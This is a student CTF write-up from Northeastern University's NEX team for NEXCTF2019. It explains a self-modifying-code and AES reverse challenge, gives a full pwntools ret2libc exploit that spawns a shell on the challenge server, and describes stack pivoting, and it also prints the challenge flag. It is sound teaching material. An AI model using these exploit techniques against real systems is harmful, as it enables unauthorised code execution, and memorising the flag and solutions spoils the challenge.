# NEXCTF2019
## Preface

This is the first time that our students of grade 17 hold CTF.  The design of challenges fully considers the progressive step and takes care of the freshmen of grade 19. Finally, I hope you can get something from NEXCTF2019, and I hope this can arouse your interest in learning CTF. We NEX is a CTF team in Northeastern University. Forget to say, the ranking in CTF is not important. We sincerely hope that you can improve yourself through one competition after another. As a team of ideological exchange, we sincerely welcome you to come at any time.

## The author's complaint

Before the ninth week,  the week of exam. As a pwn and reverse player in the NEX team, I have the unavoidable responsibility to give this writeup. So, I am forced working hard to write the writeup of binary(Pwn, Reverse) challenges.

I really hope you can learn technology after reading this writeup. There are codes to solve the challenges, but I strongly recommend that you do not use it directly, but instead try it by yourself step by step.

## Reverse

There are three reverse challenges in this CTF. Actually, the amount of people who solve reverse challenges is far below my expectation. What a disappointment it is. Below is writeup of challeng "Re3".

Using IDA to open this program, we easily found that this program is very simple:

![](./re3/1.png)

First receive a string of length 39. Then, for the function `sub_40080F`, performing xor with value `0x99`. This technology is called SMC (Self Modify Code), which changes its code at runtime.

When cracker open the function `sub_40080F`, he'll quickly find that this function is con't readable.

At this point, there are two solutions:

- Debug this ELF executable, and make a break point, analyze the function in memory.
- Use IDAPython to decrypt manually.

First solution, you should configure IDA remote debugging environment, that's easily, any question, baidu or goolge it.

Second solution, It's convenient for you to get starting with IDAPython, docs: https://www.hex-rays.com/products/ida/support/idapython_docs/. Note that idatython failed to run, It may be the wrong configuration of the python environment of your computer.

```python
start = 0x40080F
end = 0x04008A8
ads = start
while ads <= end:
	t = get_byte(ads)
	patch_byte(t^0x99)
	ads += 1
print "OK"
```

After runing this IDAPython, you'll find function sub_400B0F shows below, note that pressing 'U' to undefine, and pressing 'P' to define procdure (function). If you didn't do this, you may not succeed

![](./re3/2.png)



![](./re3/3.png)

Here I recommend you use the findcrypt plug-in of ida, will soon find this is AES algorithm.

```c
AES_init_ctx(&ctx, key);
AES_ECB_decrypt(&ctx, vdata);
AES_ECB_decrypt(&ctx, vdata+0x10);
```

So the problem was solved immediately.

```python
In [8]: from Crypto.Cipher import AES

In [9]: key = b"1111111111111111"

In [10]: cipher = b"\xE7\x5B\x8A\xCA\x42\x27\x46\x41\xE8\x0A\xD9\x5A\x9A\x7F\x2E\x11\x53\xBB\xCB\xDA\xE9\x98\xA0\xC3\xA2\x14\x2E\x3B\x26\x5E\x33\x97"

In [11]: aes = AES.new(key, AES.MODE_ECB)

In [12]: m = aes.decrypt(cipher)

In [13]: print m
flag{i_th1nk_reverse_1n_CTFisok}

```

## Pwn1_easystack

The original purpose of this challenge is to let you know the ROP technology in stack overflow exploitation.

Any principle about stack overflow, plz reference liveoverflow's binary hacking video: https://www.bilibili.com/video/av18860370

Here,  Opening this challenge in IDA, there is stack buffer overflow in function `vuln`, it read up to 0x100 len data to buf, which size is 0x20: 

![](./pwn1_easystack/1.png)

Using pwntools' checksec, canary protection is off.

![](./pwn1_easystack/2.png)

The idea of exploit is as follows:

- ROP to puts@plt(puts@got), leak address of puts in libc;
- ROP to libc, execute system("/bin/sh");

exploit.py

```python
from pwn import *
# io = process("./pwn1")
io = remote("handsomedog.top", 10001)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./pwn")
context.arch = elf.arch
pop_rdi = 0x0000000000400773
payload = "A"*0x20 + "B"*8 + flat(
    [
        pop_rdi, elf.got["puts"], elf.plt["puts"], 0x0400666
    ]
)
io.sendafter(": \n", payload)
libc.address = u64(io.recvline().strip().ljust(8, "\x00"))-libc.sym["puts"]
success("libc: 0x%x"%libc.address)
payload = "A"*0x20 + "B"*8 + flat(
    [
        pop_rdi, next(libc.search("/bin/sh")), libc.sym["system"]
    ]
)
io.send(payload)
io.interactive()
```

![](./pwn1_easystack/3.png)

## Pwn2_easystack_revenge

Different with challenge `pwn1_easystack`, this program can only overflow 16 bytes, which means we can't do ROP on the stack. However, there is a tecnolgy called stack migration, use gadget `leave, ret;` make `esp` pointer to another place where we could control easily. In this challenge, we could use this to make stack lays on `.bss` segment, then do ROP like `pwn1_easystack`.